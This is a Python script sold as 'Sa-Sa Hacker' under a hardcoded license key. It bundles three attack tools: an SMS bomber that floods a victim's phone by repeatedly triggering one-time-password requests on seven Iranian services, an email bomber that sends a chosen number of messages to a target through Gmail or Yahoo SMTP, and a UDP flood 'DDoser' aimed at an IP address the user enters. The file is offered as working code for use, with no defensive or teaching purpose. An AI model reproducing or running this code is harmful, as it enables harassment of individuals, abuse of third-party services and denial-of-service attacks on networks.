#==================((=>> Library

from urllib3 import PoolManager
from json import dumps
from time import sleep
import smtplib
import getpass
import socket
import random
import sys 
import os

#==================((=>> Bomber API

def send(cellphone):
    http = PoolManager()
    # 1. snap otp [OK]
    http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        headers={'Content-Type': 'application/json'},
        body=dumps({"cellphone": f"+98{cellphone}"}).encode())
    # 2. tap33 otp [OK]
    http.request("post", "https://tap33.me/api/v2/user",
        headers={'Content-Type': 'application/json'},
        body=dumps({"credential": {"phoneNumber": f"0{cellphone}", "role": "PASSENGER"}}).encode())
    # 3. echarge [OK]
    http.request("post", "https://www.echarge.ir/m/login?length=19",
        headers={'Content-Type': 'application/json'},
        body=dumps({"phoneNumber": f'0{cellphone}'}).encode())
    # 4. divar [OK]
    http.request("post", "https://api.divar.ir/v5/auth/authenticate",
        headers={'Content-Type': 'application/json'},
        body=dumps({"phone": f'0{cellphone}'}).encode())
    # 5. shad  [OK]     
    http.request("post", "https://shadmessenger12.iranlms.ir/",
     headers={'Content-Type': 'application/json'},
      body=dumps({"phone": f'0{cellphone}'}).encode())
    # 6. rubika [OK]  
    http.request("post", "https://messengerg2c4.iranlms.ir/",
     headers={'Content-Type': 'application/json'},
      body=dumps({"phone": f'+{cellphone}'}).encode())
    # 7. emtiaz [OK]
    http.request("post", "https://web.emtiyaz.app/json/login",
     headers={'Content-Type': 'application/json'},
      body=dumps({"phone": f'+98{cellphone}'}).encode())

#==================((=>> Bomber

def bomber():
    cellphone = input("  **  Phone (eg: 9122222222)                =>> ")
    times = int(input("  **  Number of sending sms                 =>> "))
    for i in range(times):
        print("  **  Sending sms {"+str(i+1)+"}/{"+str(times)+"}")
        try:
            send(cellphone)
        except KeyboardInterrupt:
            exit()
        sleep(2)
    print('  **  SENT :)')

#==================((=>> Mail Bomber

def mailbomb():
    server = input ("  **  MailServer 1.Gmail/2.Yahoo: ")
    user = input("  **  Email: ")
    passwd = getpass.getpass("  **  Password: ")
    to = input("  **  To: ")
    body = input("  **  Message: ")
    total = int(input("  **  Number of send: "))
    if server == 'gmail' or '1' or 'Gmail':
        smtp_server = 'smtp.gmail.com'
        port = 587
    elif server == 'yahoo' or '2' or 'Yahoo':
        smtp_server = 'smtp.mail.yahoo.com'
        port = 25
    else:
        print("  **  Kindly Enter Your Answer in 1 or 2 in Mail Server.")
        sys.exit()
    print ('')
    try:
        server = smtplib.SMTP(smtp_server,port)
        server.ehlo()
        if smtp_server == "smtp.gmail.com":
            server.starttls()
        server.login(user,passwd)
        for i in range(1, total+1):
            subject = os.urandom(9)
            msg = "From: "+str(user)+"\nSubject: "+str(subject)+"\n"+str(body)
            server.sendmail(user,to,msg)
            print ("\r  **  [+]E-mails sent: %i" % i)
            sys.stdout.flush()
        server.quit()
        print ("\n  **  Done  !!!")
    except KeyboardInterrupt:
        print ("  **  [-] Canceled")
    except smtplib.SMTPAuthenticationError:
        print ("  **  [!] Allow access to app by https://www.google.com/settings/security/lesssecureapps")

#==================((=>> DDoser

def ddoser():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = input("  **  IP Target  =>> ")
    port = int(input("  **  Port       =>> "))
    number = int(input("  **  Number     =>> "))
    for sent in range(number):
         sock.sendto(bytes, (ip,port))
         port = port + 1
         if sent % 200 == 0:
              print( "  **  Sent %s packet to %s :)"%(sent,ip))
         if port == 65534:
              port = 1

#==================((=>> Main

def main():
    print(" Sa-Sa Hacker || 2021 || Made by Sahand.S  -=\|/=-  \n")
    license_key = input("  **  Your license (Buy license: @dev_sasa) =>> ")
    if license_key == "sasa0492" or license_key == "Xf0996wn": 
        None
    else:
        print("  **  WRONG LICENSE !!")
        return
    menu = int(input("  **  Press 1 to use sms bomber  =]]\n  **  Press 2 to use ddoser      =]]\n  **  Press 3 to use mail bomber =]]\n  **  =>> "))
    if menu == 1:
        bomber()
    elif menu == 2:
        ddoser()
    elif menu ==3:
        mailbomb()

#==================((=>> Start
        
if (__name__ == "__main__"):
    while True:
        main()
        exitt = input("  **  Press b to back ; Press another key to exit =>> ")
        if exitt != "b":
            break
        os.system("cls")
